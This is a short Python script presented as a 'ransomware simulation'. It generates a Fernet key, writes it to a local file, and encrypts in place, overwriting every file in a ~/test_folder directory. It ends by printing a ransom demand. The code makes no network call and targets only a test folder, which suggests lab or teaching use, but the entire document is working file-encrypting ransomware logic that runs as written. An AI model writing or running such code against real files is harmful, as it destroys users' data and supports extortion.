from cryptography.fernet import Fernet
import os

# Generate encryption key
key = Fernet.generate_key()
cipher = Fernet(key)

# Save key to file (attacker would steal this)
with open("encryption_key.key", "wb") as key_file:
    key_file.write(key)

print("[*] Ransomware Simulation Started")
print(f"[*] Encryption key saved to encryption_key.key")

# Encrypt all files in test_folder
folder = os.path.expanduser("~/test_folder")
for filename in os.listdir(folder):
    filepath = os.path.join(folder, filename)
    if os.path.isfile(filepath):
        print(f"[+] Encrypting: {filename}")
        with open(filepath, "rb") as file:
            data = file.read()
        encrypted_data = cipher.encrypt(data)
        with open(filepath, "wb") as file:
            file.write(encrypted_data)

print("[!] All files encrypted!")
print("[!] Your files are now locked. Pay ransom to decrypt.")
